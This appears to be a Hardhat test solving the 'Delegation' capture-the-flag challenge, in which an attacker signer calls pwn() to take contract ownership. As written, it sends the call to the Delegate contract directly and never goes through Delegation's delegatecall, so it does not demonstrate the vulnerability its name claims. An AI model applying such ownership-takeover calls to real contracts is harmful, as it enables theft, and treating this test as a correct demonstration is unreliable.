import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";

describe("Delegation", () => {
  let delegate: Contract;
  let delegation: Contract;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    const [DelegateFactory, DelegationFactory] = await Promise.all([
      ethers.getContractFactory("Delegate"),
      ethers.getContractFactory("Delegation"),
    ]);

    delegate = await DelegateFactory.deploy(owner.address);
    await delegate.deployed();

    delegation = await DelegationFactory.deploy(delegate.address);
    await delegation.deployed();

    delegate = delegate.connect(attacker);
    delegation = delegation.connect(attacker);
  });

  it("Solves the challenge", async () => {
    const iface = new ethers.utils.Interface(["function pwn()"]);
    const data = iface.encodeFunctionData("pwn");

    const tx = await attacker.sendTransaction({
      to: delegate.address,
      data,
      gasLimit: 100000,
    });
    await tx.wait();

    expect(await delegate.owner()).to.equal(attacker.address);
  });
});
